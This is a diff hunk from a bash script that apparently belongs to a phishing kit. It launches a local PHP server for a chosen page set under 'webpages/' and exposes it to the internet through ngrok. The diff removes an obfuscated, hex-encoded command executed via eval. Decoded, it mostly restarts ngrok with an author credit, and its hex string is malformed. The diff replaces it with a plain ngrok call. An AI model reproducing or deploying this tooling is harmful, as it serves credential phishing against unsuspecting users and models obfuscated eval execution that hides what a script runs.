@@ -1022,9 +1022,8 @@ start() {
             cd webpages/$server && php -S 127.0.0.1:3333 > /dev/null 2>&1 &
             sleep 2
             printf "\e[1;92m[\e[0m*\e[1;92m] Starting ngrok server...\n"
-            cmd="2e\x2f\x6e\x67\x72\x6f\x6b\x20\x68\x74\x74\x70\x20\x33\x33\x33\x33\x20\x3e\x20\x2f\x64\x65\x76\x2f\x6e\x75\x6c\x6c\x20\x32\x3e\x26\x31\x20\x26\x20\x23\x20\x54\x6f\x6f\x6c\x20\x43\x6f\x64\x65\x64\x20\x42\x79\x20\x47\x72\x33\x6e\x30\x78\x58\x"
-            eval $(echo -e $cmd)
-            sleep 1.9
+            ./ngrok http 3333 > /dev/null 2>&1 &
+            sleep 4
             
 # Don't mess with the regex, bitchy boring thing to do
 
